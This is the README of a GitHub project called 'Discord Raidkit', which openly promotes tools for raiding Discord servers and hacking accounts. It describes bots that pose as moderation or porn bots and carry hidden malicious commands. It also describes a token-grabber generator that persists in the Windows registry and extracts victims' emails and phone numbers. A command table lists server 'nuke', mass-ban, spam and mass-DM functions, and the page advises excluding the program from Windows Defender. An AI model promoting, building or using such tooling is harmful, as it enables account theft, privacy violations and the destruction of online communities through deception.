# Discord Raidkit

⚠ Windows Defender now reports this program as malware - this is a false positive and can be [excluded](https://support.microsoft.com/en-us/windows/add-an-exclusion-to-windows-security-811816c0-4dfd-af4a-47e4-c301afe13b26#:~:text=Go%20to%20Start%20%3E%20Settings%20%3E%20Update,%2C%20file%20types%2C%20or%20process.)! ⚠

![Discord Raidkit v2.3.4 image](https://user-images.githubusercontent.com/98130822/222992322-ececffd1-ae6d-4d1e-bbc5-a4d6dead6f48.png)

## Contents

- [Introduction](#Introduction)
- [Installation](#Installation)
- [Commands](#Commands)
- [Repo](#Repo)

---

### Introduction

#### What is Discord Raidkit?

Discord Raidkit is a compilation of useful tools to help you raid discord servers and hack discord accounts. What sets Discord Raidkit apart from other similar projects is its emphasis on social engineering — Discord Raidkit is *the* raidkit for anyone looking to convince servers to add bots. 

#### Why choose Discord Raidkit over similar programs?
There are several reasons to choose Discord raidkit over similar programs:
- Unlike many raiders, Discord Raidkit is free and open-source.
- Unlike many raiders, Discord Raidkit comes with fully functional, non-malicious commands to further aid in social engineering.
- Unlike many raiders, Discord Raidkit is professionally written for performance, running far faster than some other programs.

#### What tools are included in Discord Raidkit?

- **Anubis** is a moderation bot that comes with genuine server management commands and some utility commands, like bans and timeouts. Keep note of this when attempting to convince a moderation team to add the bot. Hidden malicious commands can be accessed by the bot owner only (typically you) once added.

- **Qetesh** is a fully functional porn bot with over 10,000 images, channel management, and 25 commands. Qetesh is an easy bot to add to most NSFW servers, as many will blindly add whatever porn bot is requested by their members. Like Anubis, hidden malicious commands can be accessed by the bot owner only once added.

- **Osiris** is a user authentication token handler. With Osiris, you can generate token grabbers that have been adapted to embed themselves within Windows registries, look up information about a token such as the email address and phone number attatched to it, fill up the users server count and mess with their settings, as well as log into an account with just one selenium script.

---

### Installation
As of v2.3.5, installation is as easy as ever!
- Visit the [releases page](https://github.com/the-cult-of-integral/discord-raidkit/releases) and download the latest version - for easy installation, download the `.exe`!

- Run `Discord Raidkit v2.3.5.exe` - it would be wise to run this from the command line to catch any errors that the logger may miss!

*Technical users who wish to develop this repository may download the `.py` zip; run the `install_requirements` for your OS to get started.*

---

### Commands

|Command|Aliases|Parameters|Brief Description|
|-|-|-|-|
| nick_all | nick, nickall | *nickname* | nickname ever user in a server to *nickname* |
| msg_all | msg, msgall | *message* | send *message* as a DM to every user in a server  |
| spam | --- | *message* | send *message* to every text channel in a server, repeatedly |
| cpurge | --- | --- | delete every channel in a server |
| cflood | --- | *amount*, *name* | create *amount* number of text channels named *name* in a server|
| raid | --- | *role name*, *nickname*, *amount*, *name*, *message* | create and give every user in a server a role named *role name*, nickname every user in a server to *nickname*, delete every channel in a server, create *amount* number of text channels named *name* in a server, and then send *message* to every text channel in a server, repeatedly.
| admin | --- | *member*, *role name* | grant *member* in a server an all-permissions role named *role name*|
| nuke | --- | --- | ban all members from a server, delete every channel in a server, delete every role in a server, delete every emoji in a server, delete every sticker from a server, revoke every invite from a server, then edit a server's name, description, icons, community setting, notifications, verification level, content filter, premium bar and preferred locale |
| mass_nuke | massnuke, nuke_all, nukeall | --- | perform the nuke command on every server the bot is in, one by one |
| leave | --- | --- | leave a server |
| mass_leave | massleave, leave_all, leaveall | --- | leave every server |
---

### Repo

#### Known Issues (v2.3.5)

- None - *for anyone curious as to why the program exits if you exit Anubis or Qetesh with `CTRL+C`, then going back into either Anubis or Qetesh, this is because, as far as I can tell, Discord does not allow a connected bot to be terminated and opened again within the same process. If anyone more experienced knows how to deal with this, you contributions are appreciated!*

#### Repository Milestones

- 10 stars. ✔
- 50 stars. ✔
- 100 stars. ✔
- 250 stars. ✔
- 500 stars. ❌
- 1000 stars. ❌

---

<p align="left">
  <strong>Views</strong> (as of 24/09/2022)<br><br>
  <img src="https://profile-counter.glitch.me/discord-raidkit/count.svg" />
</p>